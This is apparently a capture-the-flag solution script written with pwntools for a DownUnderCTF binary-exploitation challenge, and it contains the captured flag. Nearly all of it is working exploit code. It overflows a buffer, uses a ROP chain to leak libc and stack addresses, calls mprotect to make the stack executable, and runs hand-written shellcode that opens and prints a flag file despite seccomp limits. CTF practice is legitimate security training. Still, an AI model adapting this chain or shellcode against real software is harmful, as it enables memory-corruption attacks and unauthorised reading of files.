#exploit for ret2whatrevenge
#DUCTF{secc0mp_noT_$tronk_eno0Gh!!@}
from pwn import *
elf = ELF("./return-to-whats-revenge")
context.binary=elf
libc=ELF('libc6_2.27-3ubuntu1_amd64.so')
target=remote('chal.duc.tf',30006)

def sla(string,val):
	target.sendlineafter(string,val)

main=0x4011b2
poprdi=0x00000000004019db 
ret=0x0000000000401016
payload="A"*0x38+p64(poprdi)+p64(elf.got["puts"])+p64(elf.plt["puts"])+p64(main)
sla("to?\n",payload)
libc_leak=u64(target.recv(6).ljust(8,"\x00"))
libc_base=libc_leak-libc.symbols["puts"]
libc_mprotect=libc_base+libc.symbols["mprotect"]
libc_environ=libc_base+libc.symbols["environ"]
libc_malloc_hook=libc_base+libc.symbols["__malloc_hook"]
poprsi=libc_base+0x0000000000023e6a
poprdx=libc_base+0x0000000000001b96
payload="A"*0x38+p64(poprdi)+p64(libc_environ)+p64(elf.plt["puts"])+p64(main)
sla("to?\n",payload)
stack_leak=u64(target.recv(6).ljust(8,"\x00"))
filepath=stack_leak-0xf8
shellcode_addr=filepath+0x88
stack_base=(stack_leak>>12)<<12
payload="/chal/flag.txt\x00"+"A"*(0x38-15)
payload+=p64(poprdi)+p64(stack_base)+p64(poprsi)+p64(0x1000)+p64(poprdx)+p64(0x7)+p64(libc_mprotect)
payload+=p64(poprdi)+p64(filepath)+p64(shellcode_addr)
shellcode="\x48\x31\xF6\x48\x31\xD2\x48\x31\xC0\xB0\x02\x0F\x05\x48\x31\xFF\x40\x88\xC7\x48\xBE"
shellcode+=p64(libc_malloc_hook)
shellcode+="\xB2\xFF\x48\x31\xC0\x0F\x05\x40\xB7\x01\xB0\x01\x0F\x05"
payload+=shellcode
target.sendline(payload)
target.interactive()
